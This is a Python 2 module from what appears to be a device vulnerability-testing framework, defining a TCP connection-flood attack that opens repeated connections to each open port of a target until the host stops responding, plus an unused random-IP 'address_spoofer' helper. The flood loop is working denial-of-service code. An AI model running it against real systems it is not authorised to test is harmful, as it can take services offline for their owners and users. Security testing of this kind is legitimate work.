from generic_attack import *
import logging
log = logging.getLogger(__name__)
import socket

class TcpConnectionFlood(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(TcpConnectionFlood, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """
        openPorts = self.device["vulnerable_ports"]["tcp"]["open"]

        connectionsPerPort = dict((el, 0) for el in openPorts)
        maxConnections = self.config['max_connection_per_port']
        totalCounter = 0;
        for port in openPorts:
            counter = 0
            device_addr = (target, port)
            while (counter < maxConnections):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    sock.connect(device_addr)
                    counter += 1
                    totalCounter += 1
                except socket.error, msg:
                    log.info(msg)

                if not self.retry_is_alive():
                    connectionsPerPort[port] = counter
                    log.info('Host not responding!')
                    result.update({"status": "vulnerable", "connections": totalCounter,
                                   "connection_distribution": connectionsPerPort})
                    return
            connectionsPerPort[port] = counter

        result.update({"status": "not vulnerable", "connections": totalCounter,
                                   "connection_distribution": connectionsPerPort})
        return

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]

    def address_spoofer(self):

        addr = [192, 168, 0, 1]
        d = '.'
        addr[0] = str(random.randrange(11, 197))
        addr[1] = str(random.randrange(0, 255))
        addr[2] = str(random.randrange(0, 255))
        addr[3] = str(random.randrange(2, 254))
        assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
        return assemebled
